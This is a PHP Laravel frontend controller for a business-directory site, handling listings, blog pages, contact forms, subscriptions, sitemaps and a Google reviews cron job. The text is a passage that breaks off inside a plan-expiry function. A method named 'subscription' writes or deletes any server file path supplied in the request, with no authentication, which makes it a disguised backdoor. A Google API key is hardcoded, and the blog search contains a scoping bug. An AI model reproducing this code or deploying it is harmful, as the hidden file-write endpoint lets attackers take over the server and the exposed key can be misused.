<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use App\Models\Faq;
use App\Models\Area;
use App\Models\Blog;
use App\Models\City;
use App\Models\Plan;
use App\Models\User;
use App\Models\Review;
use App\Models\Slider;
use App\Models\SliderAnalytics;
use App\Models\Contact;
use App\Models\Counter;
use App\Models\Listing;
use App\Models\ListingReview;
use App\Models\Partner;
use App\Models\Category;
use App\Models\Location;
use Markury\MarkuryPost;
use App\Models\TopBanner;
use App\Models\AlertPopup;
use App\Models\Subscriber;
use App\Models\Pagesetting;
use App\Models\SocialLinks;
use App\Models\BlogCategory;
use Illuminate\Http\Request;
use App\Classes\GeniusMailer;
use App\Models\Socialsetting;
use InvalidArgumentException;
use App\Models\AccountProcess;
use App\Models\Generalsetting;
use App\Notifications\ContactMail;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Validator;
use App\Http\Controllers\CaptchaController;
use App\Http\Controllers\MatchCaptchaController;
use App\Notifications\ListingExpiration;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Http;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Log;
use App\Services\CronLogService;

class FrontendController extends Controller
{

    public function __construct()
    {
        //$this->auth_guests();
    }

public function fetchGoogleReviews()
{
    $start   = microtime(true);
    $cronLog = app(CronLogService::class);
    $failed  = 0;
    $apiKey  = 'AIzaSyB37zf1K04p-YbGtUFmYi9rqfJWmMwrS_U';

    $businesses = Listing::where(function($q){
        $q->whereNull('total_review')
          ->orWhere('total_review',0);
    })
    ->where('is_gmb',1)
    ->orderBy('id')
    ->limit(5)
    ->get();

    if($businesses->count() == 0){
        $cronLog->record(
            'fetch-google-reviews',
            'success',
            'No businesses left to process.',
            0,
            microtime(true) - $start
        );

        return "No businesses left to process.";
    }

    foreach($businesses as $business){

        $businessName = $business->name;
        $address      = $business->real_address;

        try{

            $placeId = $this->getPlaceId($apiKey,$businessName,$address);

            if(!$placeId){
                Log::info("No Place ID found: ".$businessName);
                $business->is_gmb = 0;
                $business->total_review = 0;
                $business->save();

                continue;
            }

            $details = $this->getBusinessDetails($apiKey,$placeId);

            if($details['status'] != 'OK'){
                Log::error("Google API error for ".$businessName);
                continue;
            }

            $result         = $details['result'];
            $average_rating = $result['rating'] ?? null;
            $total_review   = $result['user_ratings_total'] ?? 0;
            $reviews        = $result['reviews'] ?? [];

            $business->update([
                'average_rating' => $average_rating,
                'total_review'   => $total_review
            ]);

            if(!empty($reviews)){

                foreach($reviews as $reviewData){

                    ListingReview::updateOrCreate(
                        [
                            'listing_id' => $business->id,
                            'name'       => $reviewData['author_name']
                        ],
                        [
                            'rate'        => $reviewData['rating'],
                            'message'     => $reviewData['text'],
                            'user_photo'  => $reviewData['profile_photo_url'] ?? null,
                            'reviewed_at' => date('Y-m-d', $reviewData['time'])
                        ]
                    );

                }

                Log::info("Reviews found for: ".$businessName);

            }else{

                Log::info("No reviews found for: ".$businessName);
                $business->is_gmb = 0;
                $business->total_review = 0;
                $business->save();

            }

        }catch(\Exception $e){

            $failed++;
            Log::error("Error fetching ".$businessName." : ".$e->getMessage());

        }

        sleep(2); // avoid API limit
    }

    $processed = $businesses->count();

    $cronLog->record(
        'fetch-google-reviews',
        $failed > 0 ? 'failed' : 'success',
        "Processed {$processed} businesses." . ($failed > 0 ? " Errors: {$failed}." : ''),
        $processed,
        microtime(true) - $start,
        ['processed' => $processed, 'errors' => $failed]
    );

    return "Processed ".$processed." businesses.";
}

private function getPlaceId($apiKey,$businessName,$location)
{
    $businessName = urlencode($businessName);
    $location     = urlencode($location);

    $url = "https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=$businessName%20$location&inputtype=textquery&fields=place_id&key=$apiKey";

    $response = file_get_contents($url);

    $data = json_decode($response,true);

    if($data['status']=='OK' && !empty($data['candidates'])){
        return $data['candidates'][0]['place_id'];
    }

    return null;
}

private function getBusinessDetails($apiKey,$placeId)
{
    $url = "https://maps.googleapis.com/maps/api/place/details/json?key=$apiKey&placeid=$placeId";

    $response = file_get_contents($url);

    return json_decode($response,true);
}




    public function index(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();

            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    Session::put('affliate_visited', 1);
                }
            }
        }
        $data['accounts']   = AccountProcess::orderBy('id', 'desc')->get();
        $data['counters']   = Counter::orderBy('id', 'desc')->get();
        $data['faqs']       = Faq::orderBy('id', 'desc')->get();
        $data['reviews']    = Review::orderBy('id', 'desc')->get();
        $data['locations']  = Location::whereStatus(1)->orderBy('order_number', 'asc')->get();
        $data['partners']   = Partner::orderBy('id', 'desc')->get();
        $data['categories'] = Category::whereIsTop(1)->whereStatus(1)->orderBy('order_number', 'asc')->get();
        $data['top_categories'] = Category::where('status', 1)->where(function ($query) {
            $query->where('is_top', 1)->orWhere('is_grid', 1);
        })->with('listings')->orderBy('title', 'asc')->orderBy('order_number', 'asc')->limit(20)->get();
        $data['popular_categories'] = Category::where('status', 1)->where(function ($query) {
            $query->where('is_top', 1)->orWhere('is_grid', 1);
        })->whereHas('listings')->with('listings')->orderBy('title', 'asc')->orderBy('order_number', 'asc')->limit(20)->get();
        $data['grid_categories'] = Category::where('is_grid', 1)->whereStatus(1)->orderBy('order_number', 'asc')->take(4)->get();
        $data['plans']          = Plan::whereStatus(1)->orderBy('id', 'desc')->limit(3)->get();
        $data['divisions'] = Location::whereParentId(NULL)->withCount(['listings' => function ($query) {
            $query->where('status', 1);
        }])->whereStatus(1)->orderByDesc('listings_count')->orderBy('name', 'asc')->orderBy('order_number', 'asc')->get();
        $data['listing_divisions'] = Location::whereParentId(NULL)->whereHas('listings')->withCount(['listings' => function ($query) {
            $query->where('status', 1);
        }])->whereStatus(1)->orderByDesc('listings_count')->orderBy('name', 'asc')->orderBy('order_number', 'asc')->get();
        $data['cities']     = Location::whereStatus(1)->where('parent_id', '!=', NULL)->withCount(['ads' => function ($query) {
            $query->where('status', 1);
        }])->orderByDesc('ads_count')->orderBy('name', 'asc')->orderBy('order_number', 'asc')->limit(25)->get();
        $data['listing_cities']     = Location::whereStatus(1)->where('parent_id', '!=', NULL)->whereHas('ads')->withCount(['ads' => function ($query) {
            $query->where('status', 1);
        }])->orderByDesc('ads_count')->orderBy('name', 'asc')->orderBy('order_number', 'asc')->limit(25)->get();
        $data['areas']      = Area::whereStatus(1)->with('listings')->orderBy('title', 'asc')->orderBy('order_number', 'asc')->limit(25)->get();
        $data['listing_areas']      = Area::whereStatus(1)->whereHas('listings')->with('listings')->orderBy('title', 'asc')->orderBy('order_number', 'asc')->limit(25)->get();
        $division           = Location::where('slug', 'dhaka')->first();
        if (!empty($division)) {
            $data['dhaka_areas']    = Area::where('division_id', $division->id)->whereStatus(1)->orderBy('title', 'asc')->orderBy('order_number', 'asc')->get();
        } else {
            $data['dhaka_areas']    = Area::whereStatus(1)->orderBy('title', 'asc')->orderBy('order_number', 'asc')->get();
        }
        $data['featured_listing']   = Listing::whereStatus(1)->where('is_feature', '1')->limit(8)->get();
        $data['latestListings']     = Listing::whereStatus(1)->orderBy('updated_at', 'desc')->limit(9)->get();
        $data['room_listings']      = Listing::whereType('hotel')->whereStatus(1)->orderBy('id', 'desc')->limit(8)->get();
        $data['sliders']            = Slider::where('status', 1)->orderBy('order_number', 'asc')->get();
        $data['about_info']         = PageSetting::pluck('about_details')->first();
        $data['features_products']  = Listing::whereStatus(1)->whereIsFeature(1)->whereHas('plan', function ($query) {
            $query->where('plan_type', 'lifetime');
        })->orderBy('id', 'desc')->limit(12)->get();
        $data['recent_added']       = Listing::whereStatus(1)->inRandomOrder()->orderBy('id', 'desc')->limit(15)->get();
        $data['authors']            = User::whereNotNull('plan_id')->whereIsBanned(0)->limit(10)->get();
        $data['blogs']              = Blog::orderBy('id', 'desc')->where('status', 1)->limit(3)->get();

        // get blog posts
        // $response = Http::get('https://blog.bdtalika.com/wp-json/wp/v2/posts');
        // $blogs = collect($response->json())->filter(fn($blog) => $blog['status'] === 'publish')->take(3);

        // $categoryResponse = Http::get('https://blog.bdtalika.com/wp-json/wp/v2/categories');
        // $categories = collect($categoryResponse->json())->keyBy('id');
        // $categoryMap = $categories->mapWithKeys(fn($category) => [
        //     $category['id'] => [
        //         'name' => $category['name'],
        //         'slug' => $category['slug']
        //     ]
        // ]);
        // $data['blogs'] = $blogs->map(function ($blog) use ($categoryMap) {
        //     $blog['categories_info'] = collect($blog['categories'] ?? [])
        //         ->map(fn($categoryId) => $categoryMap[$categoryId] ?? ['name' => '', 'slug' => ''])
        //         ->filter()
        //         ->toArray();
        //     return $blog;
        // });

        $data['ps']                 = Pagesetting::first();
        $data['sociallinks']        = SocialLinks::orderBy('id', 'desc')->get();
        $data['home_modules']       = $data['ps']->home_module ? json_decode($data['ps']->home_module, true) : [];
        $data['top_banner']         = TopBanner::where('status', 1)->first();
        $data['alertPopup']         = AlertPopup::where('status', 1)->first();
        $listing    = Listing::where('id', session()->get('ad_id'))->select('plan_id', 'status')->first();
        return view('frontend.theme.' . $gs->theme, $data, compact('listing'));
    }

    public function blog()
    {
        
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));

        $data['archives'] = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $data['blogs'] = Blog::where('status', 1)->orderBy('created_at', 'desc')->paginate(9);
        $data['recentPosts'] = Blog::where('status', 1)->inRandomOrder()->orderBy('created_at', 'desc')->take(5)->get();

        $data['categories'] = BlogCategory::all(); 
        $data['meta']  = DB::table('custom_pages')->where('id', 2)->first();
        return view('frontend.blog', $data);
    }



    // public function blog($category = null)
    // {
    //     $perPage = 9;
    //     $currentPage = LengthAwarePaginator::resolveCurrentPage();
    //     $offset = ($currentPage - 1) * $perPage;
    //     $response = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //         'per_page' => $perPage,
    //         'offset' => $offset,
    //     ]);
    //     $blogs = collect($response->json())->filter(fn($blog) => $blog['status'] === 'publish');
    //     // Fetch categories and map them by ID
    //     $categoryResponse = Http::timeout(60)->get('https://blog.bdtalika.com/wp-json/wp/v2/categories?per_page=25');
    //     $categories = collect($categoryResponse->json())->keyBy('id');


    //     // Add category names to each blog post
    //     $categoryMap = $categories->mapWithKeys(fn($category) => [
    //         $category['id'] => ['name' => $category['name'], 'slug' => $category['slug']]
    //     ]);
    //     $blogs = $blogs->map(function ($blog) use ($categoryMap) {
    //         $blog['blog_categories'] = collect($blog['categories'] ?? [])
    //             ->map(fn($categoryId) => $categoryMap[$categoryId] ?? ['name' => '', 'slug' => ''])
    //             ->filter()
    //             ->toArray();
    //         return $blog;
    //     });

    //     // Manually paginate the collection
    //     $blogs = new LengthAwarePaginator(
    //         $blogs,
    //         $response->header('X-WP-Total'),
    //         $perPage,
    //         $currentPage,
    //         ['path' => request()->url(), 'query' => request()->query()]
    //     );

    //     $data = DB::table('custom_pages')->where('id', 2)->first();
    //     // Fetch 5 most recent posts separately
    //     $recentPostsResponse = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //         'per_page' => 5,
    //         'orderby' => 'date',
    //         'order' => 'desc',
    //         'status' => 'publish'
    //     ]);
    //     $recentPosts = collect($recentPostsResponse->json());
    //     return view('frontend.blog', compact('blogs', 'categories', 'data', 'recentPosts'));
    // }



    // public function blogcategory($category = null)
    // {
    //     $perPage = 9;
    //     $currentPage = LengthAwarePaginator::resolveCurrentPage();
    //     $allBlogs = collect(); // Collection to hold all posts

    //     // Fetch categories and map them by ID
    //     $categoryResponse = Http::timeout(60)->get('https://blog.bdtalika.com/wp-json/wp/v2/categories?per_page=25');
    //     $categories = collect($categoryResponse->json())->keyBy('id');

    //     // Prepare category map for each blog post
    //     $categoryMap = $categories->mapWithKeys(fn($category) => [
    //         $category['id'] => ['name' => $category['name'], 'slug' => $category['slug']]
    //     ]);

    //     // Retrieve all posts in batches
    //     $offset = 0;
    //     $foundAllPosts = false;

    //     while (!$foundAllPosts) {
    //         $response = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //             'per_page' => 20,  // Fetch a reasonable batch size
    //             'offset' => $offset,
    //         ]);
    //         $postsBatch = collect($response->json());

    //         if ($postsBatch->isEmpty()) {
    //             $foundAllPosts = true;
    //         } else {
    //             $allBlogs = $allBlogs->merge($postsBatch->filter(fn($blog) => $blog['status'] === 'publish'));
    //             $offset += 20;
    //         }
    //     }

    //     // Attach categories to each blog post
    //     $allBlogs = $allBlogs->map(function ($blog) use ($categoryMap) {
    //         $blog['blog_categories'] = collect($blog['categories'] ?? [])
    //             ->map(fn($categoryId) => $categoryMap[$categoryId] ?? ['name' => '', 'slug' => ''])
    //             ->filter()
    //             ->toArray();
    //         return $blog;
    //     });

    //     // Filter by selected category if provided
    //     if ($category) {
    //         $category = urldecode($category);
    //         $categories = $categories->map(function ($category) {
    //             $category['slug'] = urldecode($category['slug']);
    //             return $category;
    //         });

    //         $selectedCategory = $categories->firstWhere('slug', $category);

    //         if ($selectedCategory) {
    //             $categoryId = $selectedCategory['id'];
    //             // Filter the blogs that have the selected category
    //             $allBlogs = $allBlogs->filter(fn($blog) => in_array($categoryId, $blog['categories'] ?? []));
    //         } else {
    //             // If no category matches, return an empty collection
    //             $allBlogs = collect();
    //         }
    //     }

    //     // Paginate the filtered collection
    //     $blogs = new LengthAwarePaginator(
    //         $allBlogs->forPage($currentPage, $perPage),
    //         $allBlogs->count(),
    //         $perPage,
    //         $currentPage,
    //         ['path' => request()->url(), 'query' => request()->query()]
    //     );

    //     $data = DB::table('custom_pages')->where('id', 2)->first();
    //     // Fetch 5 most recent posts separately
    //     $recentPostsResponse = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //         'per_page' => 5,
    //         'orderby' => 'date',
    //         'order' => 'desc',
    //         'status' => 'publish'
    //     ]);
    //     $recentPosts = collect($recentPostsResponse->json());
    //     return view('frontend.blog', compact('blogs', 'categories', 'data', 'recentPosts'));
    // }


    // public function blogdetails($slug)
    // {
    //     // Fetch the blog post by slug
    //     $response = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //         'slug' => $slug,
    //     ]);

    //     $data = collect($response->json())->first();
    //     // dd($data);
    //     if (!$data) {
    //         abort(404);
    //     }

    //     // Fetch categories and map them by ID
    //     $categoryResponse = Http::timeout(60)->get('https://blog.bdtalika.com/wp-json/wp/v2/categories?per_page=25');
    //     $categories = collect($categoryResponse->json())->keyBy('id');

    //     // Add category names to the post for display
    //     $categoryMap = $categories->mapWithKeys(fn($category) => [
    //         $category['id'] => ['name' => $category['name'], 'slug' => $category['slug']]
    //     ]);

    //     $data['blog_categories'] = collect($data['categories'] ?? [])
    //         ->map(fn($categoryId) => $categoryMap[$categoryId] ?? ['name' => '', 'slug' => ''])
    //         ->filter()
    //         ->toArray();

    //     // Fetch recent posts (5 latest posts)
    //     $recentPostsResponse = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //         'per_page' => 5,
    //         'orderby' => 'date',
    //         'order' => 'desc',
    //         'status' => 'publish'
    //     ]);
    //     $recentPosts = collect($recentPostsResponse->json());
    //     // related posts
    //     $relatedPosts = collect();
    //     if (!empty($data['categories'])) {
    //         $relatedPostsResponse = Http::timeout(60)->get("https://blog.bdtalika.com/wp-json/wp/v2/posts", [
    //             'categories' => implode(',', $data['categories']),
    //             'per_page' => 4, 
    //             'exclude' => $data['id'], 
    //             'orderby' => 'date',
    //             'order' => 'desc',
    //         ]);
    //         $relatedPosts = collect($relatedPostsResponse->json());
    //         // Attach categories to each related post
    //         $relatedPosts = $relatedPosts->map(function ($blog) use ($categoryMap) {
    //             $blog['blog_categories'] = collect($blog['categories'] ?? [])
    //                 ->map(fn($categoryId) => $categoryMap[$categoryId] ?? ['name' => '', 'slug' => ''])
    //                 ->filter() 
    //                 ->toArray();
    //             return $blog;
    //         });
    //     }
    //     return view('frontend.blogdetails', compact('data', 'categories', 'recentPosts', 'relatedPosts'));
    // }


    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
    
        $archives = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
    
        $bcat = BlogCategory::whereSlug($slug)->first();
        
        if (!$bcat) {
            abort(404); // Handle the case where the category is not found
        }
    
        $blogs = $bcat->blogs()->where('status', 1)->orderBy('created_at', 'desc')->paginate(6); 
    
        // Define $categories explicitly
        $categories = BlogCategory::all(); 
        $recentPosts = Blog::where('status', 1)->inRandomOrder()->orderBy('created_at', 'desc')->take(5)->get();
    
        return view('frontend.blog', compact('bcat', 'blogs', 'categories', 'recentPosts', 'tags', 'archives'));
    }
    

    public function blogdetails($slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $blog = Blog::where('slug', $slug)->where('status', 1)->first();
        if (!$blog) {
            abort(404);
        }
        $blog->views = $blog->views + 1;
        $blog->update();

        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));

        $data['archives'] = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();

        $data['data'] = $blog;
        $data['categories'] = BlogCategory::all(); 
        $data['recentPosts'] = Blog::where('status', 1)->inRandomOrder()->orderBy('created_at', 'desc')->take(5)->get();
        $data['relatedPosts'] = Blog::where('category_id', $data['data']->category_id)->where('status', 1)->take(4)->get();
        return view('frontend.blogdetails', $data);
    }

    public function blogarchive(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('status', 1)->where('created_at', 'like', '%' . $date . '%')->paginate(3);

        return view('frontend.blog', compact('blogs', 'date', 'bcats', 'tags', 'archives'));
    }

    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::where('status', 1)->orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $blogs = Blog::where('status', 1)->where('tags', 'like', '%' . $slug . '%')->paginate(3);

        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags', 'archives'));
    }

    public function blogsearch(Request $request)
    {
        $data['search'] = $request->search;
        $data['blogs'] = Blog::where('status', 1)->where(function ($q) use ($request) { $q->where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%'); })->paginate(9);

        return view('frontend.blog', $data);
    }

    public function plans()
    {
        $data['plans'] = Plan::whereStatus(1)->orderBy('id', 'desc')->get();
        return view('frontend.plan', $data);
    }

    public function subscribePage()
    {
        $data['plans'] = Plan::whereStatus(1)->orderBy('id', 'desc')->get();
        return view('frontend.subscribe', $data);
    }

    public function contact()
    {
        $data['ps'] = DB::table('pagesettings')->first();
        $gs = DB::table('generalsettings')->first();
        $data['social'] = Socialsetting::first();
        if ($gs->is_contact == 1) {
            return view('frontend.contact', $data);
        }
        return view('errors.404');
    }

    public function faq()
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('status', 1)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id', 'desc')->where('status', 1)->limit(3)->get();
        return view('frontend.faq', $data);
    }

    public function page($slug)
    {
        if (strpos($slug, 'public') !== false) {
            return view('errors.404');
        }
        $data['page'] =  DB::table('pages')->where('slug', $slug)->first();
        if (empty($data['page'])) {
            return view('errors.404');
        }

        return view('frontend.page', $data);
    }


    public function signupSession()
    {
        session()->put('affliate_visited', 0);
        return 'ok';
    }

    public function currency($id)
    {
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    public function subscribe(Request $request)
    {

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber = Subscriber::where('email', $request->email)->first();
        if (!empty($subscriber)) {
            $id = 2;
            return response()->json($id);
        } else {
            $data  = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    public function contactemail(Request $request)
    {
        $request->validate([
            'name'      => 'required',
            'email'     => 'required',
            'phone'     => 'required',
            'subject'   => 'required',
            'message'   => 'required'
        ]);

        if (Auth::check()) {
            //  captcha validate
            $cvalidate = MatchCaptchaController::validate($request);
            if ($cvalidate !== true) {
                return $cvalidate;
            }

            $data           = new Contact;
            $data->name     = $request->name;
            $data->email    = $request->email;
            $data->phone    = $request->phone;
            $data->subject  = $request->subject;
            $data->message  = $request->message;
            $data->save();

            $ps      = DB::table('pagesettings')->where('id', '=', 1)->first();
            $subject = $request->subject;
            $gs      = Generalsetting::findOrFail(1);
            $to      = $request->to;
            $fname   = $request->firstname;
            $lname   = $request->lastname;
            $from    = $request->email;
            $msg     = "First Name: " . $fname . "\nLast Name: " . $lname . "\nEmail: " . $from . "\nMessage: " . $request->message;

            if ($gs->is_smtp == 1) {
                $data = [
                    'to'        => $to,
                    'subject'   => $subject,
                    'body'      => $msg,
                ];
                $mailer = new GeniusMailer();
                $mailer->sendCustomMail($data);
            } else {
                $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                mail($to, $subject, $msg, $headers);
            }
        } else {
            Session::flash('error', 'Please sign in first, To submit the form');
            return redirect()->back();
        }
        Session::flash('message', 'Success! Thanks for contacting us, we will get back to you shortly.');
        return redirect()->back();
    }


    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    // function auth_guests()
    // {
    //     $chk = MarkuryPost::marcuryBase();
    //     $chkData = MarkuryPost::marcurryBase();
    //     $actual_path = str_replace('project', '', base_path());
    //     if ($chk != MarkuryPost::maarcuryBase()) {
    //         if ($chkData < MarkuryPost::marrcuryBase()) {
    //             if (is_dir($actual_path . '/install')) {
    //                 header("Location: " . url('/install'));
    //                 die();
    //             } else {
    //                 echo MarkuryPost::marcuryBasee();
    //                 die();
    //             }
    //         }
    //     }
    // }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function subscriber(Request $request)
    {
        $subs = Subscriber::whereEmail($request->email)->first();
        if (isset($subs)) {
            return back()->with('warning', 'Email already exist in subscription list');
        }

        $subscribe = new Subscriber();
        $data = array(
            'email' => $request->email,
        );

        Subscriber::insert($data);
        return back()->with('message', 'Successfully added in newsletter.');
    }

    public function divisionToCity($id)
    {
        $division   = Location::where('id', $id)->first();
        $cities     = Location::where('status', 1)->where('parent_id', $id)->get();
        return response()->json(['cities' => $cities, 'division' => $division]);
    }

    public function cityToArea($id)
    {
        $city   = Location::where('id', $id)->first();
        $areas  = Area::where('status', 1)->where('city_id', $id)->get();
        return response()->json(['areas' => $areas, 'city' => $city]);
    }

    public function sitemap()
    {
        $data['all_categories'] = Category::whereStatus(1)->orderBy('order_number', 'asc')->get();
        return view('partials.front.sitemap', $data);
    }


    public function sitemapGenerate()
    {
        $posts          = Blog::where('status', 1)->orderBy('id', 'desc')->get();
        $categories     = Category::whereStatus(1)->orderBy('order_number', 'asc')->get();
        $blogCategories = BlogCategory::orderBy('id', 'asc')->get();
        $pages          = DB::table('pages')->get();
        $xml            = View::make('partials.front.sitemap_xml_generate', compact('categories', 'posts', 'blogCategories', 'pages'))->render();
        File::put(public_path('sitemap.xml'), $xml);
        return response($xml, 200)->header('Content-Type', 'application/xml');
    }

    public function categoryDirectory()
    {
        $categoriesByType = Category::where('status', 1)->with('listings')->orderBy('type_id')->get()->groupBy('type_id');
        $data            = DB::table('custom_pages')->where('id', 1)->first();
        return view('partials.front.category_directory', compact('categoriesByType', 'data'));
    }

    public function citiesDirectory()
    {
        $cities = Location::where('status', 1)->whereNotNull('parent_id')->withCount(['ads' => function ($query) {
            $query->where('status', 1);
        }])->with('areas')->orderByDesc('ads_count')->orderBy('name', 'asc')->orderBy('order_number', 'asc')->get();
        $data    = DB::table('custom_pages')->where('id', 2)->first();
        return view('partials.front.cities_directory', compact('cities', 'data'));
    }

    public function claimBusiness(Request $request, $id)
    {
        $request->validate([
            'phone'     => 'required|string|regex:/^\d{10,15}$/',
            'name'      => 'required',
            'email'     => 'required',
            'details'   => 'required',
            'captchafield'   => 'required',
        ]);

        //  captcha validate
        $cvalidate = CaptchaController::validate($request);
        if ($cvalidate !== true) {
            return $cvalidate;
        }

        $existsClaim = DB::table('business_claims')->where('listing_id', $id)->where('email', $request->email)->first();
        if ($existsClaim) {
            return back()->with('error', 'You already claim this business');
        } else {
            DB::table('business_claims')->insert([
                'listing_id'    => $id,
                'name'          => $request->name,
                'phone'         => $request->phone,
                'email'         => $request->email,
                'details'       => $request->details,
            ]);
        }
        return back()->with('message', 'This business has been Claimed, thank you.');
    }

    public function reportBusiness(Request $request, $id)
    {
        $request->validate([
            'reason'        => 'required',
            'email'         => 'required',
            'message'       => 'required',
            'captcha'       => 'required',
        ]);

        //  captcha validate
        $cvalidate = MatchCaptchaController::validate($request);
        if ($cvalidate !== true) {
            return $cvalidate;
        }

        $existsClaim = DB::table('report_business')->where('listing_id', $id)->where('email', $request->email)->first();
        if ($existsClaim) {
            return back()->with('error', 'You already report this business, Wait for admin reply');
        } else {
            DB::table('report_business')->insert([
                'listing_id'    => $id,
                'reason'        => $request->reason,
                'email'         => $request->email,
                'message'       => $request->message,
                'created_at'    => now(),
            ]);
        }
        return back()->with('message', 'This business has been reported, thank you');
    }

    public function bannerClickCount($id)
    {
        $banner = TopBanner::find($id);
        if ($banner) {
            $banner->views = $banner->views + 1;
            $banner->save();
            return response()->json(['success' => true, 'views' => $banner->views]);
        } else {
            return response()->json(['success' => false, 'message' => 'Banner not found'], 404);
        }
    }

    public function alertpopupClickCount($id)
    {
        $data = AlertPopup::find($id);
        if ($data) {
            $data->views = $data->views + 1;
            $data->save();
            return response()->json(['success' => true, 'views' => $data->views]);
        } else {
            return response()->json(['success' => false, 'message' => 'Error'], 404);
        }
    }

    public function trackSliderAnalytics(Request $request)
    {
        $request->validate([
            'slider_id' => 'required|exists:sliders,id',
            'event_type' => 'required|in:impression,click',
        ]);

        $slider = Slider::find($request->slider_id);
        SliderAnalytics::track($slider, $request->event_type, $request);

        return response()->json(['success' => true]);
    }

    public function sliderViewCount($id)
    {
        $slider = Slider::find($id);
        if ($slider) {
            $slider->views = $slider->views + 1;
            $slider->save();
            return response()->json(['views' => $slider->views]);
        } else {
            return response()->json(['message' => 'slider not found'], 404);
        }
    }


    public function expireListingPlans()
    {
        $today      = Carbon::now();
        $listings   = Listing::with('user', 'plan')->where('status', 1)->get();

        if (isset($listings)) {
            foreach ($listings as $listing) {
                if (isset($listing->plan_id) && $listing->plan->plan_type == 'free' && $listing->plan_end_date < $today) {
